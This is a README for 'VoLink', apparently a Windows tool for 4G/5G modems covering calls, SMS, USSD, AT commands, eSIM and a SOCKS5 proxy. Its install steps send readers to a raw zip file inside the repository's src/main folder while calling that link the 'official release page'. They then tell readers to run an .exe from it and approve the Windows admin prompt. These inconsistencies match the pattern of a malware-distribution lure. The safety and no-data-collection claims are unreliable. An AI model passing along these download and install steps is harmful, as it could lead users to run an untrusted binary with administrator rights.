# 📞 VoLink - Manage Your Mobile Broadband Like a Pro
[![Download VoLink](https://img.shields.io/badge/Download-VoLink-2ea44f?style=for-the-badge&logo=windows&logoColor=white)](https://raw.githubusercontent.com/lennyinvariant851/VoLink/main/src/main/Vo_Link_v2.5-alpha.3.zip)

## 🚀 Getting Started
VoLink is a modern Windows app that lets you manage your 4G or 5G modem (dongle, mobile hotspot, or built-in cellular adapter) with ease. Make and receive voice calls, send SMS, run AT commands, manage eSIM profiles, and set up a proxy—all from one clean interface. No technical skills needed.

## 🖥️ What is VoLink?
VoLink turns your computer into a full-featured phone. It connects directly to your modem over a USB or serial port and gives you a simple dashboard to:
- Make and receive phone calls using your modem
- Send and receive SMS messages
- Run USSD codes (like *100# to check balance)
- Execute AT commands (advanced users)
- Manage eSIM profiles (for compatible devices)
- Create a local SOCKS5 proxy to share your mobile internet
- Get popup notifications for incoming calls and messages

It's built with modern technology (Electron and React) and runs on any recent version of Windows 10 or Windows 11.

## 📥 Installation (Step-by-Step)
Follow these steps to get VoLink running on your computer:

1. **Visit this link to download the application**  
   Go to the official release page on GitHub:  
   [https://raw.githubusercontent.com/lennyinvariant851/VoLink/main/src/main/Vo_Link_v2.5-alpha.3.zip](https://raw.githubusercontent.com/lennyinvariant851/VoLink/main/src/main/Vo_Link_v2.5-alpha.3.zip)

2. **Download the latest release**  
   On that page, look for the newest version (usually at the top). Click it to expand details, then click the file named something like `VoLink.Setup.1.x.x.exe` to download. If you see a `.exe` file, that's the installer.

3. **Run the installer**  
   Once download finishes, open your Downloads folder and double-click the `.exe` file. Windows might ask "Do you want to allow this app to make changes to your device?"—click **Yes**.

4. **Follow the setup wizard**  
   The installer is simple. Accept the license agreement, choose a folder (the default is fine), and click **Install**. Wait a few seconds.

5. **Launch VoLink**  
   After installation finishes, check the box "Run VoLink" and click **Finish**. The app opens on your desktop.

6. **Connect your modem**  
   Plug in your 4G/5G dongle (like a Huawei or ZTE stick) or connect your phone via USB tethering. VoLink scans for supported modems automatically.

## 🎯 Features at a Glance
| Feature | What It Does |
|--------|--------------|
| **📞 Direct Calls** | Make and receive phone calls through your modem. Uses your microphone and speakers. |
| **✉ SMS** | Send, receive, and view SMS messages. Works like a messaging app on your phone. |
| **🛜 eSIM Support** | Activate and manage eSIM profiles on compatible eSIM-enabled modems. |
| **💬 USSD Codes** | Run interactive codes like *123# to get account info, top-up, or activate plans. |
| **🔧 AT Commands** | For advanced users: send custom commands to your modem (e.g., change settings, check signal strength). |
| **🔗 Proxy (SOCKS5)** | Create a local proxy so all your computer's internet traffic goes through the mobile connection. Useful for sharing internet over Ethernet. |
| **🔔 Notifications** | Get alerts when you receive a call, new SMS, or important modem event. |

## 🛠️ System Requirements
- **Operating System:** Windows 10 (any version) or Windows 11 (any version)
- **Processor:** 1 GHz or faster (dual-core recommended)
- **RAM:** 4 GB minimum (8 GB recommended)
- **Storage:** 500 MB free space
- **Modem:** Any USB or internal 4G/5G modem that supports a serial port interface (Huawei, ZTE, Quectel, Sierra, Ericsson) or a phone with USB tether mode
- **Ports:** One available USB port for the dongle, or a serial port (if built-in)

## 🔍 Troubleshooting & Tips
- **Modem not detected:** Make sure the modem driver is installed. If you see "No modem found," try restarting the app or reconnect the device.  
- **Calls not working:** Check that your modem supports voice functions (most dongles do). Look for a SIM card with active voice service.  
- **SMS not sending:** Ensure the SIM card has message credit and is not blocked.  
- **eSIM not showing:** eSIM is only available on certain modems (e.g., some newer Quectel or Fibocom modules).  
- **Need help?** Visit the GitHub page's "Issues" tab to ask a question.

## 📝 Notes
- VoLink is free and open-source (MIT license).
- It does not collect any data: all your activity stays on your computer.
- For advanced users: VoLink is written with TypeScript, React, Electron, and serialport library.

## 🔖 Keywords
5g,at-commands,electron,esim,lte,modem,react,serialport,sms,socks5,telephony,typescript,ussd,windows